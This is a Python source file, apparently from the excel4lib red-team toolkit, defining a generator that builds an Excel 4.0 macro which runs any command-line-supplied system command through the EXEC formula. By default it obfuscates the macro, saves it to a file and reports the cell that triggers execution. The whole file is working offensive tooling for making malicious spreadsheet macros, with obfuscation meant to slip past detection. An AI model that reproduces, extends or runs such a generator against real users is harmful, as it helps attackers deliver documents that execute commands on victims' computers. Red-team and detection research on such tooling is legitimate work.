import sys
from excel4lib.generator.generator import *
from excel4lib.lang import *
from excel4lib.macro.routine import Excel4Routines


class Excel4ExecGenerator(Excel4Generator):
    '''
    `Excel4ExecGenerator` allows to generate Excel 4.0 Macro that runs system command via EXEC method.

    '''
    description = "Generates Excel4 Macro that allows to run system command via Exec formula."
    name = "Excel4ExecGenerator"


    def __init__(self, worksheet_name="Excel4ExecGenerator"):

        Excel4Generator.__init__(self, worksheet_name, obfuscator=Excel4Obfuscator(), routines=Excel4Routines(), desc=Excel4ExecGenerator.description)
        self.obfuscators = self.obfuscators + []

    def custom_args(self):
        '''
        Adds command line arguments to ArgumentParser
        '''
        self.args_parser.add_argument("--cmd", "-c", required=False, help="command to execute")


    def generate_macro(self):
        if not self.args.cmd:
            self.args_parser.error("--cmd argument is required")
            sys.exit(1)
        print("[*] Creating macro with command {} ...".format(self.args.cmd))
        cmd_string = self.macro.value(self.args.cmd)
        exec_call = self.macro.formula("EXEC", cmd_string)
        print("[*] Macro created")
        if not self.args.disable_obfuscation:
            Excel4Config.obfuscator.enable = True
            print("[*] Obfsucating macro with {} obfuscator ...".format(self.obfuscator.name))
        else:
            Excel4Config.obfuscator.enable = False
        print("[*] Saving output to {} ...".format(self.args.out))
        self.macro.to_csv_file(self.args.out)
        print("[*] Output saved to {}".format(self.args.out))
        print("[*] Trigger cords: column: {} row: {}".format(self.macro.trigger_x, self.macro.trigger_y))

    @staticmethod
    def run(args):
        '''
        Runs generator

        :param args: cli arguments
        '''
        generator = Excel4ExecGenerator()
        generator.init_args()
        if len(args) == 0:
            generator.args_parser.print_help()
            sys.exit(1)
        generator.parse(args)
        generator.generate()


if __name__ == '__main__':
    Excel4ExecGenerator.run(sys.argv[1:])